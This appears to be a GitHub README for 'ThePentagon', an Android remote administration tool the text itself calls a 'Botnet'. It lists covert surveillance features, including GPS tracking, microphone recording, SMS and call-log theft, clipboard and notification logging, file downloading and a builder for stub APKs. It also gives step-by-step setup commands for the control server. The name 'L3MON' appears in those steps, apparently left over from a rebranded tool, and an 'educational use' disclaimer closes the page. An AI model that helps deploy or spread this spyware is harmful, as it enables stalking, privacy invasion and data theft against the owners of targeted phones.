<p align="center">
<img src="https://raw.githubusercontent.com/vikasyt/ThePentagon/master/logo.png" height="60"><br>
A cloud based remote android managment suite, powered by NodeJS
</p>



## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder

## Prerequisites 
 - Java Runtime Environment 8
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server

## Installation 
1. Install JRE 8 (We cannot stress this enough USE java 1.8.0 ANY issues that dont use this will be closed WITHOUT a response)
    - Debian, Ubuntu, Etc
        - `sudo apt-get install openjdk-8-jre`
    - Fedora, Oracle, Red Hat, etc
        -  `su -c "yum install java-1.8.0-openjdk"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `npm install pm2 -g`

4. Download and Extract the latest release from [HERE](https://github.com/vikasyt/ThePentagon/releases/download/1.1/The.Pentagon.v1.1.zip)

5. In the extracted folder, run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- to run L3MON on startup

6. Set a Username & Password
    1. Stop L3MON `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. under `admin` 
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
        Default ID and Password is admin
    4. save the file
    5. run `pm2 restart all`

7. in your browser navigate to `http://<SERVER IP>:22533`
    
It's recommended to run ThePentagoan Botnet behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)

## Disclaimer
<b>Vikasyt Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
ThePentagoan is built for both Educational and Internal use ONLY.</b>

<br>
<p align="center">Made with ❤️ By VIKAS</p>
<p align="center" style="font-size: 8px">v1.1</p>
